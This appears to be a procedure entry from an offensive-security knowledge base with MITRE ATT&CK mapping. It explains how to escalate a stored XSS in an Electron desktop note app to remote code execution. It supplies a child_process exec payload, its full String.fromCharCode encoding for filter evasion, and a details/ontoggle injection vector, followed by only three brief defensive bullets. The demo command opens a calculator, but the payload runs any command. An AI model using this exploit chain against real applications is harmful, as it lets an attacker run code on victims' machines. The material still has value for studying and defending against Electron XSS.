---
id: proc-escalate-xss-rce-001
tags:
  - rce
  - escalation
  - encoding
  - nodejs
type: procedure
tools:
  - '[[tools/String-fromCharCode-Encoder]]'
  - '[[tools/Simplenote-Desktop-App]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/spawn-process-rce]]'
  - '[[commands/exec-child-process-rce]]'
verified: false
platforms:
  - Desktop
  - Electron
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:28:28.403Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploitation for Client Execution]]'
---
# Escalate-XSS-to-RCE-with-Encoded-Payload

## Summary

This procedure escalates the XSS by injecting an encoded Node.js payload that accesses Electron's process bindings to spawn external processes, achieving RCE.

## Description

From the XSS context, the payload uses `process.binding('process_wrap').Process` or `require('child_process').exec` to run system commands. Encoding with `String.fromCharCode` and `writeln` bypasses any basic filters, allowing arbitrary execution like launching calculator when printed.

## Requirements

1. Confirmed XSS vulnerability
2. Encoder tool for payload obfuscation
3. Knowledge of target OS paths (e.g., /usr/bin/gnome-calculator)

## Defense

Defensive measures and detection strategies:

- Restrict Node.js require in renderer processes
- Sandbox Electron apps
- Scan notes for encoded JS patterns

## Objectives

1. Obfuscate RCE script
2. Inject via XSS vector
3. Enable process spawning

## Instructions

### Step 1: Craft and Encode Payload

**Context**: Build Node.js code for RCE and encode it.

Use [[tools/String-fromCharCode-Encoder]] to convert script like `require('child_process').exec('/usr/bin/gnome-calculator',function(){})` to `String.fromCharCode(60,115,99,114,105,112,116,62,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,40,39,47,117,115,114,47,98,105,110,47,103,110,111,109,101,45,99,97,108,99,117,108,97,116,111,114,39,44,102,117,110,99,116,105,111,110,40,41,123,125,41,60,47,115,99,114,105,112,116,62)`.

> Encoded string ready for injection.

### Step 2: Inject Encoded Payload

**Context**: Replace basic XSS with RCE version.

**Command** ([[commands/exec-child-process-rce]]):
In a new note, input: `"><details open ontoggle=writeln(String.fromCharCode(...encoded...))>` where ... is the encoded chars.

> Payload stored; decodes on execution.

### Step 3: Alternative Long Payload

**Context**: Use process_wrap for more control.

**Command** ([[commands/spawn-process-rce]]):
Encode and inject the full Process spawn script.

> Prepares for detailed process control.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript
- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques


## Commands Used

- [[commands/spawn-process-rce]]
- [[commands/exec-child-process-rce]]

## Tools Used

- [[tools/String-fromCharCode-Encoder]]

## Tags

- rce
- escalation
